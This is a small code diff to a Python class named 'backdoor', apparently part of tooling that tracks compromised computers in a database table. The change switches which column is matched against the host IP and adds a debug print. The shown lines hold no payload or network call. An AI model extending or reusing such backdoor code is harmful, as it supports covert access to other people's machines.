@@ -17,7 +17,7 @@ class backdoor:
         pcs = self.cursor.execute("SELECT * FROM backdoor_computer").fetchall()
         self.pc_id = None
         for pc in pcs:
-            if self.ip == pc[1]:
+            if self.ip == pc[-1]:
                 self.pc_id = pc[0]
 
         if self.pc_id == None:
@@ -30,9 +30,9 @@ class backdoor:
             self.db.commit()
 
             pcs = self.cursor.execute("SELECT * FROM backdoor_computer").fetchall()
-            self.pc_id = None
             for pc in pcs:
-                if self.ip == pc[1]:
+                print(pc)
+                if self.ip == pc[-1]:
                     self.pc_id = pc[0]
         t1 = threading.Thread(target=self.ping)
         t1.start()
